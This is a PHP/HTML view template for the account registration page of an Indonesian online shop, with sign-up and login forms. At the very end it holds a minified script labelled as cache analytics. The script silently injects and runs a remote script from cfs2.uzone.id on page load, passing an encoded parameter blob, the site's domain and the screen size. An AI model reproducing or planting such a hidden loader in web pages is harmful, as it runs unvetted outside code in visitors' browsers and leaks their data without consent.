
<!doctype html>
<html lang="en">
<head>

	<meta charset="utf-8">
	<!--[if IE]>
		<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
	<![endif]-->
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="">
	<meta name="author" content="">
	
	<title>Giani Gracio | Online Shop</title>
	
	<!-- Bootstrap Core CSS -->
	<link href="<?=base_url()?>assets/css/bootstrap.min.css" rel="stylesheet">
	
	<!-- Google Web Fonts -->
	<link href="https://fonts.googleapis.com/css?family=Roboto+Condensed:400,700italic,700,400italic,300italic,300" rel="stylesheet" type="text/css">
	<link href="https://fonts.googleapis.com/css?family=Abel" rel="stylesheet" type="text/css">
	
	<!-- CSS Files -->
    <link href="http://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css" rel="stylesheet">
	<link href="<?=base_url()?>assets/css/stylecss.css" rel="stylesheet">
	<link href="<?=base_url()?>assets/css/responsive.css" rel="stylesheet">
	
	<!--[if lt IE 9]>
		<script src="js/ie8-responsive-file-warning.js"></script>
	<![endif]-->
	
	<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
	
	<!-- Fav and touch icons -->
	<link rel="apple-touch-icon-precomposed" sizes="144x144" href="images/fav-144.png">
	<link rel="apple-touch-icon-precomposed" sizes="114x114" href="images/fav-114.png">
	<link rel="apple-touch-icon-precomposed" sizes="72x72" href="images/fav-72.png">
	<link rel="apple-touch-icon-precomposed" href="images/fav-57.png">
	<link rel="shortcut icon" href="<?=base_url()?>assets/img/favicon.png">
	
</head>
<body>

<?php $this->load->view('topheader')?>
<?php
$this->load->model('modeldb');
$data['kategori'] = $this->modeldb->allcategories(); 
$this->load->view('navbar2', $data);
?>
<!-- Main Container Starts -->
	<div class="main-container container">
	<!-- Breadcrumb Starts -->
		<ol class="breadcrumb">
			<li><a href="<?=base_url()?>">Home</a></li>
			<li class="active">Register</li>
		</ol>
	<!-- Breadcrumb Ends -->
	<!-- Main Heading Starts -->
		<h2 class="main-heading text-center">
			Register <br />
			<span>Create New Account</span>
		</h2>
	<!-- Main Heading Ends -->
	<!-- Registration Section Starts -->
		<?=$this->session->flashdata('pesan')?>
		<section class="registration-area">
			<div class="row">
				<div class="col-sm-6">
				<!-- Registration Block Starts -->
					<div class="panel panel-smart">
						<div class="panel-heading">
							<h3 class="panel-title">Personal Information</h3>
						</div>
						<div class="panel-body">
						<?php validation_errors()?>
						<!-- Registration Form Starts -->
							<form class="form-horizontal" role="form" method="post" action="<?=base_url().'home/createaccount'?>">
							<!-- Personal Information Starts -->
								<div class="form-group">
									<label for="inputFname" class="col-sm-3 control-label">First Name :</label>
									<div class="col-sm-9">
	<input type="text" class="form-control" id="inputFname" placeholder="First Name" name="fname" required>
									</div>
								</div>
								<div class="form-group">
									<label for="inputLname" class="col-sm-3 control-label">Last Name :</label>
									<div class="col-sm-9">
	<input type="text" class="form-control" id="inputLname" placeholder="Last Name" name="lname" required>
									</div>
								</div>
								<div class="form-group">
									<label for="inputEmail" class="col-sm-3 control-label">Email :</label>
									<div class="col-sm-9">
	<input type="email" class="form-control" id="inputEmail" placeholder="Email" name="email" required>
									</div>
								</div>
								<div class="form-group">
									<label for="inputPhone" class="col-sm-3 control-label">Phone :</label>
									<div class="col-sm-9">
	<input type="text" class="form-control" id="inputPhone" placeholder="Phone" name="phone" required>
									</div>
								</div>
								<div class="form-group">
									<label for="inputFax" class="col-sm-3 control-label">Fax :</label>
									<div class="col-sm-9">
	<input type="text" class="form-control" id="inputFax" placeholder="Fax" name="fax">
									</div>
								</div>
							<!-- Personal Information Ends -->
								<h3 class="panel-heading inner">
									Delivery Information
								</h3>
							<!-- Delivery Information Starts -->
								<div class="form-group">
									<label for="inputCompany" class="col-sm-3 control-label">Company :</label>
									<div class="col-sm-9">
	<input type="text" class="form-control" id="inputCompany" placeholder="Company" name="company">
									</div>
								</div>
								<div class="form-group">
									<label for="inputAddress1" class="col-sm-3 control-label">Address/1 :</label>
									<div class="col-sm-9">
										<textarea class="form-control" placeholder="Address/1" name="address1" required></textarea>
									</div>
								</div>
								<div class="form-group">
									<label for="inputAddress2" class="col-sm-3 control-label">Address/2 :</label>
									<div class="col-sm-9">
										<textarea class="form-control" placeholder="Address/2" name="address2"></textarea>
									</div>
								</div>
								<div class="form-group">
									<label for="inputCity" class="col-sm-3 control-label">City :</label>
									<div class="col-sm-9">
										<select name="city" class="form-control" required>	
											<option value="0">- City -</option>									
										<?php foreach($city as $kota){?>
											<option><?=$kota->nama?></option>
										<?php } ?>
										</select>
									</div>
								</div>
								<div class="form-group">
									<label for="inputRegion" class="col-sm-3 control-label">Region / State :</label>
									<div class="col-sm-9">
										<select class="form-control" id="inputRegion" name="province" required>
											<option>- Region / State -</option>
											<?php foreach($province as $prop){?>
											<option><?=$prop->nama?></option>
											<?php } ?>
										</select>
									</div>
								</div>
								<div class="form-group">
									<label for="inputCountry" class="col-sm-3 control-label">Country :</label>
									<div class="col-sm-9">
										<select class="form-control" id="inputCountry" name="country" required>
											<option>- Country -</option>
											<option value="Indonesia">Indonesia</option>
										</select>
									</div>
								</div>
								<div class="form-group">
									<label for="inputPostCode" class="col-sm-3 control-label">Postal Code :</label>
									<div class="col-sm-9">
	<input type="text" class="form-control" id="inputPostCode" placeholder="Postal Code" name="postal"required>
									</div>
								</div>
								
								
							<!-- Delivery Information Ends -->
								<h3 class="panel-heading inner">
									Password
								</h3>
							<!-- Password Area Starts -->
								<div class="form-group">
									<label for="inputPassword" class="col-sm-3 control-label">Password :</label>
									<div class="col-sm-9">
	<input type="password" class="form-control" id="inputPassword" placeholder="Password" name="pass1" required>
									</div>
								</div>
								<div class="form-group">
									<label for="inputRePassword" class="col-sm-3 control-label">Re-Password :</label>
									<div class="col-sm-9">
	<input type="password" class="form-control" id="inputRePassword" placeholder="Re-Password" name="pass2" required>
									</div>
								</div>
								<div class="form-group">
									<div class="col-sm-offset-3 col-sm-9">
										<div class="checkbox">
											<label>
												<input type="checkbox" id="cek" onclick="check()"> I've read and agreed on Conditions
											</label>
										</div>
									</div>
								</div>
								<div class="form-group">
									<div class="col-sm-offset-3 col-sm-9">
										<button id="reg" type="submit" class="btn btn-main" disabled>
											Register
										</button>
									</div>
								</div>
							<!-- Password Area Ends -->
							</form>
						<!-- Registration Form Starts -->
						</div>							
					</div>
				<!-- Registration Block Ends -->
				</div>
				<div class="col-sm-6">
				<!-- Login Panel Starts -->
					<div class="panel panel-smart">
						<div class="panel-heading">
							<h3 class="panel-title">Login</h3>
						</div>
						<div class="panel-body">
							<p>
								Have an Account? Please login using your existing account
							</p>
						<!-- Login Form Starts -->
							<form class="form-inline" role="form">
								<div class="form-group">
									<label class="sr-only" for="exampleInputEmail2">Username</label>
									<input type="text" class="form-control" id="exampleInputEmail2" placeholder="Username">
								</div>
								<div class="form-group">
									<label class="sr-only" for="exampleInputPassword2">Password</label>
									<input type="password" class="form-control" id="exampleInputPassword2" placeholder="Password">
								</div>
								<button type="submit" class="btn btn-main">
									Login
								</button>
							</form>
						<!-- Login Form Ends -->
						</div>
					</div>
				<!-- Login Panel Ends -->
				</div>			
			</div>
		</section>
	<!-- Registration Section Ends -->
	</div>
<!-- Main Container Ends -->
<?php
$data['kontak'] = $this->modeldb->setting(); 
$this->load->view('footer2', $data);
?>
<!-- JavaScript Files -->
<script>
function check(){
	if(document.getElementById("cek").checked){
		document.getElementById('reg').removeAttribute('disabled');  
   		return false;
	}else{
		document.getElementById('reg').setAttribute('disabled', 'disabled');  
   		return false;
	}
}
</script>
<script src="<?=base_url()?>assets/js/jquery-1.11.1.min.js"></script>
<script src="<?=base_url()?>assets/js/jquery-migrate-1.2.1.min.js"></script>	
<script src="<?=base_url()?>assets/js/bootstrap.min.js"></script>
<script src="<?=base_url()?>assets/js/bootstrap-hover-dropdown.min.js"></script>
<script src="<?=base_url()?>assets/js/jquery.magnific-popup.min.js"></script>
<script src="<?=base_url()?>assets/js/custom2.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582H6x5iDAuv2BVACIgr3hsRyvCuufJ0UY0Ry6vOpcfdILgkQH18InGx%2fUcog9Na%2bzvt62XBF0GiTs5cT%2fRnc9yyHNdD3hM7EN1WldthAneOKxH3QabFiBzHqYufa2ileo%2fYGKYMRH4JPlPpPVBpwgIi49o1saFojuiHlvG768iKZxqxOZb76iXcU2FCAJseC1PmhchNfOojdWjoxPe9XFe3ruVa4INas%2bPSak6XVGXxss1%2bs4xvaDy%2bhd%2bfDmAS7TFbNKGr6qk3GI89mhV3s8oMYktPJ2IN6EQxWNonS3SrxH8YbkETOE6bBV6UGdWrRJDSPy6CGIItTIgqA%2bpPPZPXkD5MiL9SsWVi6il8ZVvDOkRK%2b0hiuW%2bGC8D04XiK6dLSacRuprQlQX6jkTuFbEJfB%2fYUpDdQymClFL%2f3NA%2fcbxzwohmluX665NWk8yf6gEPjvKics98gg5TD%2bAgWpbFUysDkQFCgTdJri%2fpza3H3U19tJJ6UUgp6W9j40nnzJwTkgkxqqn9jYkCSDCsgEo0GvYk3L6yhsTfqnCUw5qA2%2bY7jQzhzzZ%2bhuYrAxZncZg5g%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>